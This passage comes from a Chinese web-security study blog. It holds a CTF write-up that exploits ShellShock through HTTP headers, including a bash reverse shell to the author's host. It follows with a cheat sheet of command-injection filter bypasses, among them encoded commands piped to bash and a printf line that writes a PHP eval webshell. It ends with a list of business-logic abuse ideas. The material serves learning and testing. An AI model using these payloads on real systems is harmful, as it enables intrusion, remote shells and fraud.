<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $file = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        $file = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Dictionary Traversal&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="line">    $dirs = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;../..&#x27;</span>, <span class="string">&#x27;/etc/passwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>($dirs <span class="keyword">as</span> $dir) &#123;</span><br><span class="line">        printf(<span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;index.php?func=ls&amp;file=%s&quot;&gt;%1$s&lt;/a&gt;&lt;/li&gt;&#x27;</span>, $dir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&#x27;&lt;h2&gt;$ ls %s&lt;/h2&gt;&#x27;</span>, htmlentities($file));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">    execute(sprintf(<span class="string">&#x27;ls -l %s&#x27;</span>, escapeshellarg($file)));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>接下来我们就可以利用<code>ls.php</code>来找<code>flag</code>了，因为<code>ls.php</code>没什么过滤，所以用<code>func=ls&amp;file=../../../</code>可以发现根目录下的文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110130635.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>接下来就是考虑怎么读<code>flag</code>、<code>flag-reader</code>和<code>flag-reader.c</code>这三个文件了。</p>
<p><code>untar.php</code>默认执行<code>tar -tvf</code>命令没有可利用的地方，<code>man.php</code>有用户可控制的参数<code>file</code>，但是<code>preg_match('/^[\w\-]+$/', $file) !== 1</code>限制的比较死，而<code>cmd.php</code>给出了<code>env</code>命令，显示了当前bash的环境变量，而且，在<code>index.php</code>中也有一个比较特殊的PHP函数<code>putenv</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200110135237.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>比较容易让人想到也可以比较容易搜到<code>ShellShock</code>漏洞。</p>
<blockquote>
<p><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">Bash破壳漏洞原理介绍</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$black_list = [</span><br><span class="line">    <span class="string">&#x27;\/flag&#x27;</span>, <span class="string">&#x27;\(\)\s*\&#123;\s*:;\s*\&#125;;&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$b</span>/&quot;</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">&quot;<span class="subst">$b</span> detected! exit now.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$cmd, $shell=<span class="string">&#x27;bash&#x27;</span></span>) </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">&#x27;%s -c %s&#x27;</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">&#x27;HTTP_&#x27;</span>) &#123;</span><br><span class="line">        putenv(<span class="string">&quot;<span class="subst">$key</span>=<span class="subst">$val</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键就在<code>putenv</code>函数，由于<code>ShellShock</code>漏洞 padyload 需要参数，我们就可以利用<code>putenv</code>实现参数传递，直接设置<code>User-agent: () &#123; :;&#125;; echo 222222</code>，发现被 waf。</p>
<blockquote>
<p>从最后一个foreach中可以看到，它会把以HTTP_开头的元素设置到环境变量中，在一次HTTP请求中，有如下字段符合要求：</p>
<p>HTTP_ACCEPT_LANGUAGE: zh-CN,zh;q=0.9</p>
<p>HTTP_ACCEPT_ENCODING: gzip, deflate, br</p>
<p>HTTP_SEC_FETCH_MODE: navigate</p>
<p>HTTP_SEC_FETCH_SITE: cross-site HTTP_ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9</p>
<p>HTTP_SEC_FETCH_USER: ?1</p>
<p>HTTP_USER_AGENT: test</p>
<p>HTTP_UPGRADE_INSECURE_REQUESTS: 1</p>
<p>HTTP_CACHE_CONTROL: max-age=0</p>
<p>HTTP_CONNECTION: keep-alive</p>
<p>HTTP_HOST: localhost</p>
<p>这里面HTTP_USER_AGENT比较好利用。</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200112162531.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200112162904.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>查看这个正则表达式，发现可以在中间的<code>&#125;;</code>中间加一个空格绕过，即<code>User-agent: () &#123; : ;&#125;; echo test</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200112163450.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>可以正常回显，再回来看那三个文件，<code>flag</code>需要root权限读，那么先从<code>flag-reader.c</code>下手，设置<code>User-Agent: () &#123; : ;&#125;; cat /?lag-reader.c</code>，发现<code>flag</code>被屏蔽，使用<code>*</code>通配符绕过：<code>() &#123; : ;&#125;; /bin/cat /fla*.c</code>，读到flag-reader.c文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">&quot;Not enough random\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	setuid(<span class="number">1337</span>);</span><br><span class="line">	seteuid(<span class="number">1337</span>);</span><br><span class="line">	alarm(<span class="number">1</span>);</span><br><span class="line">	write(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</span><br><span class="line">	read(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">		<span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> s = read(fd, buff, <span class="number">1024</span>);</span><br><span class="line">			<span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">				write(<span class="number">1</span>, buff, s);</span><br><span class="line">			&#125;</span><br><span class="line">			close(fd);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			write(<span class="number">1</span>, <span class="string">&quot;Can not open file\n&quot;</span>, <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		write(<span class="number">1</span>, <span class="string">&quot;Wrong response\n&quot;</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审计这个C源程序，大致原理就是：1秒之内把他输出的随机字符串再输入回去，就可以打出文件内容。</p>
<p>所以目标就是通过<code>flag-reader flag</code>命令来读取<code>flag</code>文件中的内容，我们可以通过反弹shell和重定向来达到这目的，我们将输出写到某个文件中，再自动输入即可。</p>
<p>先阿里云上监听11000端口，再利用shellshock漏洞执行<code>() &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1</code></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2549">反弹shell可以看这里</a></p>
<p>反弹shell这里卡了我一天的时间，命令应该是执行成功了，但是就是在阿里云主机上没有回显，最后发现不仅要配置安全组还要在centos上对开放这个端口的防火墙。</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115101951.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>我们再去找可写目录，发现 /var/tmp具有写权限</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115113601.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>我们再构造payload：<code>() &#123; : ; &#125;; flag-reader flag &gt; /var/tmp/ca01h &lt; /var/tmp/ca01h</code>，查看<code>cat ca01h</code>，得到flag：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115103648.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h2 id="命令执行的绕过方式">命令执行的绕过方式</h2>
<h3 id="空格过滤">空格过滤</h3>
<p>空格可以用以下字符代替：</p>
<p><code>%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;</code></p>
<p><code>$IFS</code>在linux下表示分隔符，但是如果单纯的<code>cat$IFS2</code>,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个<code>&#123;&#125;</code>就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用<code>$9</code>呢，因为<code>$9</code>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p>
<h3 id="一些命令分隔符">一些命令分隔符</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
<ul>
<li>在 shell 中，担任连续指令功能的符号就是<code>;</code>。</li>
<li><code>&amp;</code>放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个<code>&amp;</code>实现这个目的。</li>
<li>管道符&quot;|&quot;左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示。</li>
</ul>
<p>我们来看一个实例，测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file_name = $_GET[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^[\/a-zA-Z0-9-_\\s]+.rpt$/m&quot;</span>, $file_name)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;regex failed&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> exec(<span class="string">&quot;/usr/bin/file -i -b &quot;</span> . $file_name);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115181431.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>这个程序的含义就是匹配文件名由字母、数字、下划线、破则号、斜杠、空白字符各种组合的并且后缀名是rpt的文件，如果匹配成功，就执行系统命令file打印文件的类型和编码信息，如果匹配失败就打印’regex failed’。</p>
<p>攻击点在<code>\\s</code>正则过滤上，<code>\\s </code>意思是匹配任何空白字符，何为空白字符，就是常见的[trnf] (Tab、回车、换行、换页)等特殊字符，这里换行符就很危险，换行符在其他场景可能没有风险，但是在shell环境下，就有可能造成命令注入，看看下面这段payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file%0aid%0a.rpt</span><br></pre></td></tr></table></figure>
<p>%0a是URL编码后的换行符，在shell的环境中执行：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115231711.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>因为在shell环境中多个命令的分隔符除了;之外还有换行符，上述payload 传入shell之后，就变成两条命令执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file -i -b file%0A</span><br><span class="line">id%0A</span><br><span class="line">.rpt</span><br></pre></td></tr></table></figure>
<p>所以就出现了打印id命令执行的内容。</p>
<p>要解决这个绕过可以把<code>\\s</code>直接换成空格，即<code>preg_match(&quot;/^[\/a-zA-Z0-9-_ ]+.rpt$/m&quot;, $file_name)</code>，但是仍然可以构造payload来注入命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file.rpt%0aid</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115232845.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>在php中，/m表示开启多行匹配模式，开启多行匹配模式之后^和$的含义就发生了变化，没开启多行模式之前(即单行匹配模式), ^ 和$ 是匹配字符串的开始和结尾，开启多行模式之后，多行模式^,$可以匹配每行的开头和结尾，所以上述payload里面含有换行符，被当做两行处理，一行匹配OK即可，所以进入了exec执行分支，进而导致命令执行。</p>
<h3 id="花括号的其他用法">花括号的其他用法</h3>
<p>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115164213.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h3 id="黑名单绕过">黑名单绕过</h3>
<h4 id="拼接绕过">拼接绕过</h4>
<p><code>a=l;b=s;$a$b</code></p>
<p>直接参考一道代码审计的<a href="http://139.224.220.67:30008/">题目</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h2&gt;calc&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&quot;&quot;;</span><br><span class="line">if(!empty($_GET))&#123;</span><br><span class="line">    $str&#x3D;$_GET[&quot;calc&quot;];</span><br><span class="line">    if(strpos($str,&quot;#&quot;)!&#x3D;&#x3D;false)</span><br><span class="line">        die;</span><br><span class="line">    if(strpos($str,&quot;&#96;&quot;)!&#x3D;&#x3D;false)</span><br><span class="line">        die;</span><br><span class="line">    if(strpos($str,&quot;flag&quot;)!&#x3D;&#x3D;false)</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">input: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;calc&quot; value&#x3D;&quot;&lt;?php echo $str;?&gt;&quot;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    echo &quot;result:&quot;.shell_exec(&quot;echo $str | bc&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
<p>这里过滤了&quot;#、`“和&quot;flag”</p>
<p>payload：<code>?calc=1;a=fl;b=ag;cat $a$b;1</code></p>
<p>用字符串拼接绕过flag，用<code>;</code>绕过<code>| bc</code></p>
<h4 id="编码绕过">编码绕过</h4>
<p>base64：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo MTIzCg&#x3D;&#x3D;|base64 -d 其将会打印123</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<p>hex：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<p>oct：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
<h4 id="单引号和双引号绕过">单引号和双引号绕过</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca&#39;&#39;t flag</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca&quot;&quot;t flag</span><br></pre></td></tr></table></figure>
<h4 id="反斜杠绕过">反斜杠绕过</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca\t fla\g</span><br></pre></td></tr></table></figure>
<h4 id="Shell特殊变量绕过">Shell特殊变量绕过</h4>
<table>
<thead>
<tr>
<th>变量</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>$0</td>
<td>当前脚本的文件名</td>
</tr>
<tr>
<td>$n</td>
<td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</td>
</tr>
<tr>
<td>$#</td>
<td>传递给脚本或函数的参数个数</td>
</tr>
<tr>
<td>$*</td>
<td>传递给脚本或函数的所有参数，而参数不存在时其值为空。</td>
</tr>
<tr>
<td>$@</td>
<td>传递给脚本或函数的所有参数，而参数不存在时其值为空。被双引号包含时，与$*稍有不同</td>
</tr>
<tr>
<td>$?</td>
<td>上个命令的退出状态，或函数的返回值</td>
</tr>
<tr>
<td>$$</td>
<td>当前shell进程ID</td>
</tr>
</tbody>
</table>
<p>比如：<code>ca$@t fla$@g</code></p>
<h4 id="长度限制">长度限制</h4>
<p><a href="https://www.freebuf.com/articles/web/154453.html">https://www.freebuf.com/articles/web/154453.html</a></p>
<blockquote>
<p>看这篇文章的时候对<code>*v</code>为什么等价于<code>rev v</code>很疑惑，后来知道了Bash 接收到命令以后，发现里面有通配符，会进行通配符扩展，然后再执行命令。也就是*v先扩展为<code>rev v</code>然后再执行。</p>
</blockquote>
<h4 id="通配符">通配符</h4>
<p>有关命令通配符的教程：<a href="http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html">http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之逻辑漏洞利用</title>
    <url>/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Web安全学习之逻辑漏洞利用">Web安全学习之逻辑漏洞利用</h1>
<h2 id="逻辑漏洞概述">逻辑漏洞概述</h2>
<p>由于程序逻辑不严谨或逻辑太过复杂，导致一些逻辑分支不能正常处理或处理错误，统称为业务逻辑漏洞。常见的逻辑漏洞有交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等，下图是简单的逻辑漏洞总结，在挖掘的过程中更多的时候需要脑洞大开：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121125603.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>挖掘逻辑漏洞的过程中，需要一些技巧和非常规思路，有点像边缘测试的思想。一般的思路是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题</span><br></pre></td></tr></table></figure>
<h2 id="逻辑漏洞分类">逻辑漏洞分类</h2>
<ul>
<li>
<p>饮料贩卖机</p>
<ul>
<li>替换订单ID，创建订单时在支付界面，在此创建订单替换订单ID（高价替换低价）</li>
<li>无限新用户优惠订单，重复创建优惠订单</li>
<li>替换优惠卷ID（未达到条件使用）</li>
<li>个别情况订单数量为1.99时，客户端只支付1元，实际上服务器认为支付了2元。</li>
<li>取货时并发（真实案例）</li>
</ul>
</li>
<li>
<p>直播</p>
<ul>
<li>快速进出房间炸房</li>
<li>无限发送点赞协议</li>
<li>修改礼物数量，0，小数，负数，特定值（一般情况下为1073741824）</li>
<li>修改礼物ID，遍历尝试是否有隐藏ID。</li>
<li>并发送礼物，抽奖</li>
<li>无限创建首次优惠订单，有些首次优惠订单是一个特殊的pid，这种的直接替换pid进行支付。有些是相同的ID，这种的提前创建订单，记录多个订单号在依次修改订单支付。</li>
<li>刷屏：发言刷屏，分享，点赞等有提示的地方刷屏</li>
<li>房间内可以申请的地方进行申请取消操作，看看是否能炸房。</li>
<li>越权踢人，增加管理员，关闭房间等操作。</li>
<li>发送的表情是否可以修改长宽（真实案例）</li>
</ul>
</li>
<li>
<p>购物app</p>
<ul>
<li>购买数量：为0，小数，负数，正负值（A为-1，B为2，总值为1）</li>
<li>代金卷：并发领取，遍历领取，同一个代金卷重复使用，未满足条件使用代金卷</li>
<li>越权：登陆，操作别人订单，修改资料</li>
</ul>
</li>
<li>
<p>外卖</p>
<ul>
<li>商品数量，0，负数，小数，特定值，正负数（A为-1，B为2，总值为1）</li>
<li>送餐员评价修改，星级，打赏金额（小数，负数）</li>
<li>商品评价，星级，评论字数，上传图片是否可以自定义格式，</li>
<li>订单超出送餐地址</li>
<li>强行货到付款，取消订单，退款</li>
<li>越权操作别人订单，登陆</li>
<li>优惠购买会员（重复使用优惠购买）</li>
</ul>
</li>
<li>
<p>交易平台</p>
<ul>
<li>钱包并发提现，负数提现</li>
<li>使用钱包支付时多个订单并发支付（是否支付金额能大于余额）</li>
<li>转账负数，并发转账</li>
<li>上架商品突破限制，例如数量，字数。</li>
<li>替换订单，创建订单号如果订单状态可修改，先进到支付界面，然后将订单修改成更大的金额，然后支付提前进入的支付界面</li>
<li>数量修改</li>
</ul>
</li>
<li>
<p>社交</p>
<ul>
<li>强行举报（读取本地消息上传那种）</li>
<li>强行加好友（一般尝试重发通过好友这条协议）</li>
<li>自由修改号码（靓号类）</li>
<li>群管理无限禁言</li>
<li>越权禁言，替人，拉黑</li>
<li>会员修改金额，数量。无限优惠购买</li>
<li>非会员使用会员功能</li>
</ul>
</li>
<li>
<p>漫画</p>
<ul>
<li>打赏金额为负数，小数，特定值（溢出）</li>
<li>越权删除评论，登陆</li>
<li>修改充值金额</li>
<li>付费漫画免费看</li>
<li>评论图片数量过多会导致客户端加载卡死</li>
</ul>
</li>
<li>
<p>音乐</p>
<ul>
<li>唱歌类软件修改上传分数等参数</li>
<li>付费下载尝试替换下载ID</li>
<li>修改付费下载金额</li>
<li>F12查看下是否有歌曲地址</li>
</ul>
</li>
<li>
<p>网约车</p>
<ul>
<li>无限叫车，重复发送协议造成市场混乱</li>
<li>修改评价分数</li>
<li>修改限时优惠叫车关键参数</li>
<li>替换优惠卷</li>
<li>越权操作其他订单</li>
</ul>
</li>
</ul>
<p>业务逻辑漏洞需要对业务熟悉，有很强的逻辑思维能力，所以下面主要描述一下ZZCMS8.1中注册、登录和密码找回出现的漏洞逻辑，再尽量多和全的收集整理相关场景。</p>
<h2 id="逻辑漏洞利用实例">逻辑漏洞利用实例</h2>
<h3 id="ZZCMS-8-1">ZZCMS 8.1</h3>
<h4 id="批量注册">批量注册</h4>
<p>我们把注册功能填写相关信息，然后抓包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174113.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>将数据包发送到repeater，每次修改username值，发现，只需要修改username值就可以注册成功用户，图形验证码无效，并且未对电话，邮箱等信息校验，可批量注册。</p>
